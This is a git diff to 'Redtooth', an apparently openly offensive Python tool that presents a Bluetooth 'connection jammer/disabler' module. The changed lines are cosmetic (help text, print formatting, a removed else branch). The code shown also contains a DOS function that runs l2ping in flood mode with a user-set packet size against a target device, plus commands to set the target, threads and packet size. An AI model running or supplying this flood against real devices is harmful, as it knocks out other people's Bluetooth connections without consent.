@@ -17,12 +17,13 @@ os.system("clear")
 art.tprint("Redtooth")
 print("=====================================")
 print("Author: Logan Goins\n")
+print("Type \"help\" for more information")
 print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk.")
 
 
 def DOS(target, packetsize):
     subprocess.call(["l2ping", "-i", "hci0", "-s", str(packetsize), "-f", target], stdout=open(os.devnull, 'wb'))
-    
+        
 
 def jam_module():
     while True:
@@ -57,18 +58,18 @@ def jam_module():
         if cmd == "set" and subcmd == "target":
 
             target = arg
-            print(target + " ---> target\n")
+            print(target + " ---> target")
 
 
         if cmd == "set" and subcmd == "threads":
             
             threads_count = arg
-            print(threads_count + " ---> threads\n")
+            print(threads_count + " ---> threads")
 
         if cmd == "set" and subcmd == "packetsize":
             
             packetsize = arg
-            print(packetsize + " ---> packet size\n")
+            print(packetsize + " ---> packet size")
 
 
         if cmd == "run":
@@ -80,8 +81,6 @@ def jam_module():
         if cmd == "stop":
             os.system("killall l2ping")
 
-        else:
-            print("invalid command")
 
 
 def scan():
@@ -183,8 +182,10 @@ def main():
             jam_module()
 
         if cmd == "show" and subcmd == "modules":
-            print("\nModules:\n===============================\njam   ---   bluetooth connection jammer/disabler")
-           
+            print("\nModules:\n===============================")
+            print("jam       ---   bluetooth connection jammer/disabler")
+            
+
 
         if cmd == "help" or cmd == "show" and subcmd == "options":
             help_menu()
